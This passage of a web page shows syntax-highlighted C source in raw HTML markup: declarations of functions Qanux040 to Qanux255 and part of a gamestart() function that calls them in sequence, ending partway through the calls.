class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux041</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux042</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux043</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux044</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux045</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux046</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux047</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux048</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux049</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux050</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux051</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux052</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux053</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux054</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux055</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux056</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux057</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux058</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux059</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux060</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux061</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux062</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux063</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux064</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux065</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux066</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux067</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux068</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux069</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux070</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux071</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux072</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux073</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux074</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux075</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux076</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux077</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux078</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux079</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux080</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux081</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux082</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux083</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux084</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux085</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux086</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux087</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux088</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux089</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux090</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux091</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux092</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux093</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux094</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux095</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux096</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux097</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux098</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux099</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux100</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux101</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux102</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux103</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux104</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux105</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux106</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux107</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux108</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux109</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux110</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux111</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux112</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux113</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux114</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux115</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux116</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux117</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux118</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux119</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux120</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux121</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux122</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux123</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux124</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux125</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux126</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux127</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux128</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux129</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux130</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux131</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux132</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux133</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux134</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux135</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux136</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux137</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux138</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux139</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux140</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux141</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux142</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux143</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux144</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux145</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux146</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux147</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux148</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux149</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux150</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux151</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux152</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux153</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux154</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux155</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux156</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux157</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux158</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux159</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux160</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux161</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux162</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux163</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux164</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux165</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux166</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux167</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux168</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux169</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux170</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux171</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux172</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux173</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux174</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux175</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux176</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux177</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux178</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux179</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux180</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux181</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux182</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux183</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux184</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux185</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux186</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux187</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux188</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux189</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux190</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux191</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux192</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux193</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux194</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux195</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux196</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux197</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux198</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux199</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux200</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux201</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux202</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux203</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux204</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux205</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux206</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux207</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux208</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux209</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux210</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux211</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux212</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux213</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux214</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux215</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux216</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux217</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux218</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux219</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux220</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux221</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux222</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux223</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux224</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux225</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux226</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux227</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux228</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux229</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux230</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux231</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux232</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux233</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux234</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux235</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux236</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux237</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux238</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux239</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux240</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux241</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux242</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux243</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux244</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux245</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux246</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux247</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux248</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux249</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux250</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux251</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux252</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux253</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux254</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux255</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span> &#123;</span><br><span class="line">    tiandongwanxiang();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    guobapenhuo();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    Qanux000(<span class="number">0</span>);</span><br><span class="line">    Qanux001(<span class="number">1</span>);</span><br><span class="line">    Qanux002(<span class="number">2</span>);</span><br><span class="line">    Qanux003(<span class="number">3</span>);</span><br><span class="line">    Qanux004(<span class="number">4</span>);</span><br><span class="line">    Qanux005(<span class="number">5</span>);</span><br><span class="line">    Qanux006(<span class="number">6</span>);</span><br><span class="line">    Qanux007(<span class="number">7</span>);</span><br><span class="line">    Qanux008(<span class="number">8</span>);</span><br><span class="line">    Qanux009(<span class="number">9</span>);</span><br><span class="line">    Qanux010(<span class="number">10</span>);</span><br><span class="line">    Qanux011(<span class="number">11</span>);</span><br><span class="line">    Qanux012(<span class="number">12</span>);</span><br><span class="line">    Qanux013(<span class="number">13</span>);</span><br><span class="line">    Qanux014(<span class="number">14</span>);</span><br><span class="line">    Qanux015(<span class="number">15</span>);</span><br><span class="line">    Qanux016(<span class="number">16</span>);</span><br><span class="line">    Qanux017(<span class="number">17</span>);</span><br><span class="line">    Qanux018(<span class="number">18</span>);</span><br><span class="line">    Qanux019(<span class="number">19</span>);</span><br><span class="line">    Qanux020(<span class="number">20</span>);</span><br><span class="line">    Qanux021(<span class="number">21</span>);</span><br><span class="line">    Qanux022(<span class="number">22</span>);</span><br><span class="line">    Qanux023(<span class="number">23</span>);</span><br><span class="line">    Qanux024(<span class="number">24</span>);</span><br><span class="line">    Qanux025(<span class="number">25</span>);</span><br><span class="line">    Qanux026(<span class="number">26</span>);</span><br><span class="line">    Qanux027(<span class="number">27</span>);</span><br><span class="line">    Qanux028(<span class="number">28</span>);</span><br><span class="line">    Qanux029(<span class="number">29</span>);</span><br><span class="line">    Qanux030(<span class="number">30</span>);</span><br><span class="line">    Qanux031(<span class="number">31</span>);</span><br><span class="line">    Qanux032(<span class="number">32</span>);</span><br><span class="line">    Qanux033(<span class="number">33</span>);</span><br><span class="line">    Qanux034(<span class="number">34</span>);</span><br><span class="line">    Qanux035(<span class="number">35</span>);</span><br><span class="line">    Qanux036(<span class="number">36</span>);</span><br><span class="line">    Qanux037(<span class="number">37</span>);</span><br><span class="line">    Qanux038(<span class="number">38</span>);</span><br><span class="line">    Qanux039(<span class="number">39</span>);</span><br><span class="line">    Qanux040(<span class="number">40</span>);</span><br><span class="line">    Qanux041(<span class="number">41</span>);</span><br><span class="line">    Qanux042(<span class="number">42</span>);</span><br><span class="line">    Qanux043(<span class="number">43</span>);</span><br><span class="line">    Qanux044(<span class="number">44</span>);</span><br><span class="line">    Qanux045(<span class="number">45</span>);</span><br><span class="line">    Qanux046(<span class="number">46</span>);</span><br><span class="line">    Qanux047(<span class="number">47</span>);</span><br><span class="line">    Qanux048(<span class="number">48</span>);</span><br><span class="line">    Qanux049(<span class="number">49</span>);</span><br><span class="line">    Qanux050(<span class="number">50</span>);</span><br><span class="line">    Qanux051(<span class="number">51</span>);</span><br><span class="line">    Qanux052(<span class="number">52</span>);</span><br><span class="line">    Qanux053(<span class="number">53</span>);</span><br><span class="line">    Qanux054(<span class="number">54</span>);</span><br><span class="line">    Qanux055(<span class="number">55</span>);</span><br><span class="line">    Qanux056(<span class="number">56</span>);</span><br><span class="line">    Qanux057(<span class="number">57</span>);</span><br><span class="line">    Qanux058(<span class="number">58</span>);</span><br><span class="line">    Qanux059(<span class="number">59</span>);</span><br><span class="line">    Qanux060(<span class="number">60</span>);</span><br><span class="line">    Qanux061(<span class="number">61</span>);</span><br><span class="line">    Qanux062(<span class="number">62</span>);</span><br><span class="line">    Qanux063(<span class="number">63</span>);</span><br><span class="line">    Qanux064(<span class="number">64</span>);</span><br><span class="line">    Qanux065(<span class="number">65</span>);</span><br><span class="line">    Qanux066(<span class="number">66</span>);</span><br><span class="line">    Qanux067(<span class="number">67</span>);</span><br><span class="line">    Qanux068(<span class="number">68</span>);</span><br><span class="line">    Qanux069(<span class="number">69</span>);</span><br><span class="line">    Qanux070(<span class="number">70</span>);</span><br><span class="line">    Qanux071(<span class="number">71</span>);</span><br><span class="line">    Qanux072(<span class="number">72</span>);</span><br><span class="line">    Qanux073(<span class="number">73</span>);</span><br><span class="line">    Qanux074(<span class="number">74</span>);</span><br><span class="line">    Qanux075(<span class="number">75</span>);</span><br><span class="line">    Qanux076(<span class="number">76</span>);</span><br><span class="line">    Qanux077(<span class="number">77</span>);</span><br><span class="line">    Qanux078(<span class="number">78</span>);</span><br><span class="line">    Qanux079(<span class="number">79</span>);</span><br><span class="line">    Qanux080(<span class="number">80</span>);</span><br><span class="line">    Qanux081(<span class="number">81</span>);</span><br><span class="line">    Qanux082(<span class="number">82</span>);</span><br><span class="line">    Qanux083(<span class="number">83</span>);</span><br><span class="line">    Qanux084(<span class="number">84</span>);</span><br><span class="line">    Qanux085(<span class="number">85</span>);</span><br><span class="line">    Qanux086(<span class="number">86</span>);</span><br><span class="line">    Qanux087(<span class="number">87</span>);</span><br><span class="line">    Qanux088(<span class="number">88</span>);</span><br><span class="line">    Qanux089(<span class="number">89</span>);</span><br><span class="line">    Qanux090(<span class="number">90</span>);</span><br><span class="line">    Qanux091(<span class="number">91</span>);</span><br><span class="line">    